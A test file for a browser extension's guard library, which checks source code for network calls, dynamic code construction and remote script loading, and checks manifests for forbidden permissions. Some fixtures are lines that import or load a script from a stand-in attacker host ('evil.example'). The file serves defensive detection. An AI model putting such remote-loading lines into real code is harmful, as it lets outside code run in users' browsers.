import { describe, expect, it } from "vitest";
import {
  findForbiddenIdentifiers,
  findForbiddenPatterns,
  findForbiddenPermissions,
} from "../scripts/guard-lib.mjs";
import { FORBIDDEN_PERMISSIONS } from "../scripts/manifest.mjs";

describe("findForbiddenIdentifiers", () => {
  it("flags a real network call", () => {
    expect(findForbiddenIdentifiers("const r = await fetch(url);")).toContain("fetch");
  });

  it("flags each transport independently", () => {
    const source = "new WebSocket(u); new XMLHttpRequest(); new EventSource(u);";
    expect(findForbiddenIdentifiers(source).sort()).toEqual([
      "EventSource",
      "WebSocket",
      "XMLHttpRequest",
    ]);
  });

  it("ignores the word inside a comment", () => {
    expect(findForbiddenIdentifiers("// we never call fetch here\nconst a = 1;")).toEqual([]);
  });

  it("ignores the word inside a string literal", () => {
    expect(findForbiddenIdentifiers('const label = "fetch";')).toEqual([]);
  });

  it("ignores a longer identifier that merely contains one", () => {
    expect(findForbiddenIdentifiers("const prefetching = 1;")).toEqual([]);
  });

  it("passes clean source", () => {
    expect(findForbiddenIdentifiers("media.playbackRate = 2;")).toEqual([]);
  });
});

describe("findForbiddenPatterns", () => {
  it("flags dynamic code construction", () => {
    expect(findForbiddenPatterns("const f = new Function('a', 'return a');")).toContain(
      "new Function",
    );
  });

  it("flags a remote dynamic import", () => {
    expect(findForbiddenPatterns('await import("https://evil.example/x.js");')).toContain(
      "remote import()",
    );
  });

  it("flags assigning a remote script src", () => {
    expect(findForbiddenPatterns('el.src = "https://evil.example/x.js";')).toContain(
      "remote script src",
    );
  });

  it("allows a local extension URL", () => {
    expect(findForbiddenPatterns('el.src = browser.runtime.getURL("page-agent.js");')).toEqual([]);
  });
});

describe("findForbiddenPermissions", () => {
  it("flags a permission we promised not to request", () => {
    const manifest = { permissions: ["storage", "tabs"] };
    expect(findForbiddenPermissions(manifest, FORBIDDEN_PERMISSIONS)).toEqual(["tabs"]);
  });

  it("checks optional and host permissions too", () => {
    const manifest = {
      permissions: ["storage"],
      optional_permissions: ["clipboardWrite"],
      host_permissions: ["<all_urls>"],
    };
    expect(findForbiddenPermissions(manifest, FORBIDDEN_PERMISSIONS).sort()).toEqual([
      "<all_urls>",
      "clipboardWrite",
    ]);
  });

  it("passes the manifest we actually ship", () => {
    const manifest = {
      permissions: ["storage"],
      host_permissions: ["http://*/*", "https://*/*", "file:///*"],
    };
    expect(findForbiddenPermissions(manifest, FORBIDDEN_PERMISSIONS)).toEqual([]);
  });
});
